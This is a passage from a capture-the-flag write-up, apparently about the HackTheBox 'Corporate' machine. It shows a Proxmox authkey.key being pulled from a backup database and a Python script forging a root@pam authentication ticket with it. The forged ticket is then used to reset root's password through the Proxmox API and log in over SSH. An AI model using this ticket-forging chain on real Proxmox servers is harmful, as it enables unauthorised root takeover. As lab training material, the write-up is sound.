etc/lvm/profile/cache-mq.profile
etc/lvm/profile/lvmdbusd.profile
etc/lvm/profile/command_profile_template.profile
etc/lvm/profile/thin-performance.profile
etc/lvm/profile/cache-smq.profile
etc/lvm/profile/metadata_profile_template.profile
etc/lvm/lvmlocal.conf
etc/lvm/lvm.conf.bak
etc/cron.weekly/man-db
etc/cron.weekly/.placeholder
etc/vzdump.conf
etc/hosts
etc/ksmtuned.conf
etc/network/interfaces
etc/crontab
etc/cron.daily/man-db
etc/cron.daily/logrotate
etc/cron.daily/apt-compat
etc/cron.daily/.placeholder
etc/cron.daily/dpkg
etc/aliases
etc/resolv.conf
etc/pve/user.cfg
etc/pve/nodes/proxmox/lrm_status
etc/pve/nodes/proxmox/pve-ssl.key
etc/pve/nodes/proxmox/pve-ssl.pem
etc/pve/nodes/corporate/lrm_status
etc/pve/nodes/corporate/pve-ssl.key
etc/pve/nodes/corporate/pve-ssl.pem
etc/pve/nodes/corporate/qemu-server/104.conf
etc/pve/.clusterlog
etc/pve/authkey.pub
etc/pve/.version
etc/pve/pve-www.key
etc/pve/datacenter.cfg
etc/pve/.vmlist
etc/pve/vzdump.cron
etc/pve/.rrd
etc/pve/pve-root-ca.pem
etc/pve/priv/known_hosts
etc/pve/priv/authorized_keys
etc/pve/priv/pve-root-ca.key
etc/pve/priv/authkey.key
etc/pve/priv/pve-root-ca.srl
etc/pve/.members
etc/pve/authkey.pub.old
etc/pve/.debug
etc/pve/storage.cfg

```

The important file to note is `/etc/pve/priv/authkey.key`. I’ll use this shortly.

That same key is also in the other backup. In `var/tmp/proxmox-OGXn58aE/` there’s a `proxmoxpve.2023-04-15.15.36.28.tar` file. It has `var/lib/pve-cluster/config.db`. In that db, there’s one table:

```

oxdf@hacky$ sqlite3 config.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
tree
sqlite> .schema tree
CREATE TABLE tree (  inode INTEGER PRIMARY KEY NOT NULL,  parent INTEGER NOT NULL CHECK(typeof(parent)=='integer'),  version INTEGER NOT NULL CHECK(typeof(version)=='integer'),  writer INTEGER NOT NULL CHECK(typeof(writer)=='integer'),  mtime INTEGER NOT NULL CHECK(typeof(mtime)=='integer'),  type INTEGER NOT NULL CHECK(typeof(type)=='integer'),  name TEXT NOT NULL,  data BLOB);

```

There’s a bunch of entries, but one is `authkey.key`:

```

sqlite> select name from tree;
__version__
storage.cfg
user.cfg
datacenter.cfg
virtual-guest
priv
nodes
proxmox
lxc
qemu-server
openvz
priv
lock
pve-www.key
pve-ssl.key
pve-root-ca.key
pve-root-ca.pem
pve-root-ca.srl
pve-ssl.pem
vzdump.cron
firewall
ha
acme
sdn
corporate
qemu-server
lxc
lrm_status
openvz
priv
pve-ssl.key
pve-ssl.pem
104.conf
authorized_keys
known_hosts
authkey.pub.old
authkey.pub
authkey.key
lrm_status

```

I can get the key:

```

sqlite> select data from tree where name = 'authkey.key';
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4qucBTokukm1jZuslN5hZKn/OEZ0Qm1hk+2OYe6WtjXpSQtG
EY8mQZiWNp02UrVLOBhCOdW/PDM0O2aGZmlRbdN0QVC6dxGgE4lQD9qNKhFqHgdR
Q0kExxMa8AiFNJQOd3XbLwE5cEcDHU3TC7er8Ea6VkswjGpxn9LhxuKnjAm81M4C
frIcePe9zp7auYIVVOu0kNplXQV9T1l+h0nY/Ruch/g7j9sORzCcJpKviJbHGE7v
OXxqKcxEOWntJmHZ8tVb4HC4r3xzhA06IRj3q/VrEj3H6+wa6iEfYJgp5flHtVA8
...[snip]...

```

### PVE Esclation

#### Strategy

In researching Proxmox / PVE exploitation, [this article](https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/#bug-0x01-post-auth-xss-in-api-inspector) from STAR Labs walks through three exploitation paths using multiple vulnerabilities. It focuses on both PVE and Proxmox Mail Gateway (PMG) throughout the article, as both product use similar technologies and configurations and suffer the same vulnerabilities. Of interest here is the [third path](https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/#bug-0x03-post-auth-ssrf--lfi--privilege-escalation), which talks about using an SSRF + LFI to get arbitrary file read through both of the PVE and PMG APIs. It then shows using that file to read a backup file. I can skip up to this part, as I’ve already got the backup file above.

The section [Privilege escalation in PMG via unsecured backup file](https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/#privilege-escalation-in-pmg-via-unsecured-backup-file) shows how authentication works in both PVE and PMG. The server issues a cookie (referred to as a ticket in the post) of the format `PVE:{user}@{realm}:{hex(timestamp)}::{signature}`. The signature is generated using the private key at `/etc/pve/priv/authkey.key`.

I’ve got `authkey.key` from the backup file. There’s a POC Python script that exploits the entire chain. I’ll pull from that to get the parts I need to generate a ticket.

#### Generate Ticket

I’ll update the `generate_ticket` function from the POC in the post to create a ticket for `root@pam` using the `authkey.key` from the backup:

```

import base64
import subprocess
import tempfile
import time

def generate_ticket():
    timestamp = hex(int(time.time()) - 30)[2:].upper()
    plaintext = f'PVE:root@pam:{timestamp}'

    txt_path = tempfile.NamedTemporaryFile(delete=False)
    print(f'writing plaintext to {txt_path.name}')
    txt_path.write(plaintext.encode('utf-8'))
    txt_path.close()
    
    print(f'calling openssl to sign')
    sig = subprocess.check_output(
        ['openssl', 'dgst', '-sha1', '-sign', "authkey.key", '-out', '-', txt_path.name])
    sig = base64.b64encode(sig).decode('latin-1')

    ret = f'{plaintext}::{sig}'
    print(f'generated ticket for root@pam: {ret}')

generate_ticket()

```

It generates a cookie:

```

oxdf@hacky$ python generate_pve_stuff.py 
writing plaintext to /tmp/tmpyrq33jav
calling openssl to sign
generated ticket for root@pam: PVE:root@pam:668FB290::lWbUT5hPHA/9UgdNNmYFGUELe0kWTqaEuBaTdbnrBQB5E/dwDeiHB56QfQzr1PToJ5eM6Ck1/eWWYIds3g9oM2tLfkMiucDTQpWeOJgiJ8r836IQTJ0XZX0AGKI6KNEUgmEajlsWkv9uPkOdtWdrtdFITUySLZaMZv5N+0BqYCYgBTtYYHjOsLcD0+VX039/ijKGaW5V7g2hr+MwFryCVcEertM69QYnrE2qWkD2TLgJTH4R7SQh/FYZ7H/LfdYcPBhz2a3IM1zpZHin5rhc1pF+dTi7w9f6qitzvKfZ2DxFvAvT+KkrqgOG5pFsK0NEiP3XCoHSxfmSz2evJ2Swxw==

```

The POC script verifies the ticket by sending a GET request to `/`:

```

        req = requests.get(target_url, headers={'Cookie': f'PMGAuthCookie={new_ticket}'}, proxies=PROXIES,
                           verify=False)
        res = req.content.decode('utf-8')
        verify_re = re.compile('UserName: \'(.*?)\',\n\s+CSRFPreventionToken:')

```

I’ll do this in Burp:

![image-20240711063756822](/img/image-20240711063756822.png)

The POC looks for the `UserName:` structure to indicate success. I’ll also want to grab this `CSRFPreventionToken`.

#### Access API

The API docs for Proxmox are [here](https://pve.proxmox.com/pve-docs/api-viewer/). To test my ticket, I’ll start in Burp with a GET to `/api2/json/cluster/config`. I’m picking this as just something that seems like I should be able to get data back if everything is working.

In repeater, I’ll send an empty request, and it complains there’s no ticket:

![image-20240711064647221](/img/image-20240711064647221.png)

On adding the ticket as a cookie (just like above), it works:

![image-20240711064725478](/img/image-20240711064725478.png)

#### Reset Password

The PUT `api2/json/access/password` [endpoint](https://pve.proxmox.com/pve-docs/api-viewer/#/access/password) is to “Change user password”:

> Each user is allowed to change his own password. A user can change the password of another user if he has ‘Realm.AllocateUser’ (on the realm of user <userid>) and ‘User.Modify’ permission on /access/groups/<group> on a group where user <userid> is member of.

I’ll try it:

![image-20240711065407357](/img/image-20240711065407357.png)

It’s failing over an invalid csrf token. Reading through various Proxmox forums, I’ll find posts like [this one](https://forum.proxmox.com/threads/http-1-1-401-permission-denied-invalid-csrf-token-cli.75907/) that show adding that as a `CSRFPreventionToken` header. I’ll add that, and it works:

![image-20240711065450314](/img/image-20240711065450314.png)

### SSH

I’ll connect to Corporate over SSH as root:

```

oxdf@hacky$ sshpass -p 0xdf0xdf ssh root@10.9.0.1
Linux corporate 5.15.131-1-pve #1 SMP PVE 5.15.131-2 (2023-11-14T11:32Z) x86_64
...[snip]...
root@corporate:~#

```

And grab the root flag:

```

root@corporate:~# cat root.txt
58d92471************************

```